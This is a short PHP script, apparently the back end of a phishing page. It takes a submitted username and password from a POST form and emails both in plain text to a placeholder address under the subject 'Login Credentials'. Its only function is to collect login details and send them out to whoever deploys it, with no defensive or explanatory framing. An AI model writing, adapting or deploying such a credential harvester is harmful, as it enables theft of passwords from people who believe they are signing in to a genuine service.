<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    $to = "your-email@example.com"; // Replace with your email
    $subject = "Login Credentials";
    $message = "Username: " . $username . "\nPassword: " . $password;
    $headers = "From: noreply@yourdomain.com";

    if (mail($to, $subject, $message, $headers)) {
        echo "Credentials sent to email.";
    } else {
        echo "Failed to send email.";
    }
}
?>
